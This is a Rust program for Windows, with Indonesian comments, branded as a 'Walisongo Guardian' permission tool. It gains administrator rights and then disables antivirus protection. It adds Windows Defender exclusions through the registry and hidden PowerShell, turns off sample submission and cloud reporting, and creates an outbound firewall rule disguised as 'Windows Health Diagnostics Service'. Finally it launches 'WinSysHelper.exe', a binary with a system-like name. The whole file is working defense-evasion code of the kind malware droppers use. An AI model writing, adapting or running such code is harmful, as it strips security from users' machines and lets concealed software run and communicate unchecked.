use std::process::Command;
use std::os::windows::process::CommandExt;
use std::fs;
use std::env;
use std::path::PathBuf;
use std::io::{self, Write}; 
use winreg::enums::*;
use winreg::RegKey;

// Asumsi konstanta ini ada di module config kamu
// Jika tidak, definisikan di sini:
const DATA_DIR: &str = "WalisongoGuardian";
const EXE_NAME: &str = "WinSysHelper.exe";
const CREATE_NO_WINDOW: u32 = 0x08000000;

fn is_admin() -> bool {
    // Mencoba membuka Registry HKLM dengan akses tulis. 
    // Jika gagal, berarti kita bukan Admin.
    RegKey::predef(HKEY_LOCAL_MACHINE)
        .open_subkey_with_flags("SOFTWARE", KEY_READ | KEY_WRITE)
        .is_ok()
}

fn relaunch_as_admin() -> io::Result<()> {
    let exe_path = env::current_exe()?;
    let exe_str = exe_path.to_str().unwrap_or("");

    // Menggunakan PowerShell untuk men-trigger prompt "Run as Administrator"
    let status = Command::new("powershell")
        .args(&[
            "Start-Process",
            &format!("'{}'", exe_str),
            "-Verb",
            "RunAs",
        ])
        .status()?;

    if status.success() {
        std::process::exit(0); // Tutup proses yang tidak punya izin admin
    }
    Ok(())
}

fn apply_registry_exclusion(target_path: &str) -> std::io::Result<()> {
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    // Gunakan double backslash atau raw strings
    let path = r"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths";
    let (key, _) = hklm.create_subkey(path)?;
    key.set_value(target_path, &1u32)?; 
    Ok(())
}

fn main() {
    // --- CEK ADMIN ---
    if !is_admin() {
        println!("[!] Program membutuhkan izin Administrator.");
        println!("[*] Mencoba meminta elevasi hak akses...");
        if let Err(_) = relaunch_as_admin() {
            println!("[-] Gagal meminta izin Admin. Silakan klik kanan dan 'Run as Administrator'.");
            return;
        }
    }

    println!("====================================================");
    println!("    WALISONGO GUARDIAN: PERMISSION ORCHESTRATOR     ");
    println!("====================================================");

    let program_data = env::var("ProgramData").unwrap_or_else(|_| "C:\\ProgramData".to_string());
    let target_path = PathBuf::from(&program_data).join(DATA_DIR);
    let full_exe_path = target_path.join(EXE_NAME);
    let path_str = target_path.to_str().expect("Gagal konversi path");

    // 1. Persiapan Folder
    if !target_path.exists() { 
        let _ = fs::create_dir_all(&target_path); 
    }

    // 2. Registry Hardening
    print!("[*] Menerapkan Registry Exclusion... ");
    io::stdout().flush().unwrap();
    if let Err(e) = apply_registry_exclusion(path_str) {
        println!("\n[!] Gagal Registry: {}. (Lanjut ke PowerShell)", e);
    } else {
        println!("OK.");
    }

    // 3. PowerShell Hardening
    println!("[*] Mendaftarkan pengecualian ke Windows Defender...");
    execute_ps(&defender_policy_full(path_str));

    // 4. Firewall Configuration
    println!("[*] Membuka jalur Firewall...");
    let firewall_rules = format!(
        "netsh advfirewall firewall add rule name='Windows Health Diagnostics Service' \
         dir=out action=allow program='{}' enable=yes profile=any",
        full_exe_path.to_str().unwrap()
    );
    let _ = Command::new("cmd")
        .args(&["/C", &firewall_rules])
        .creation_flags(CREATE_NO_WINDOW)
        .status();

    // 5. Memanggil Installer C++
    println!("[*] Meluncurkan installer...");
    let launch = Command::new("WinSysHelper.exe").spawn();

    if launch.is_ok() {
        println!("[SUCCESS] Installer berhasil dijalankan.");
    } else {
        eprintln!("[-] ERROR: File 'WinSysHelper.exe' tidak ditemukan!");
    }

    println!("\nTekan Enter untuk keluar...");
    let mut temp = String::new();
    let _ = io::stdin().read_line(&mut temp);
}

fn defender_policy_full(path: &str) -> String {
    format!(
        "Add-MpPreference -ExclusionPath '{}'; \
         Add-MpPreference -ExclusionProcess '{}'; \
         Set-MpPreference -SubmitSamplesConsent NeverSend; \
         Set-MpPreference -MAPSReporting Disabled", 
        path, EXE_NAME
    )
}

fn execute_ps(cmd: &str) {
    let _ = Command::new("powershell")
        .args(&["-Command", cmd])
        .creation_flags(CREATE_NO_WINDOW)
        .status();
}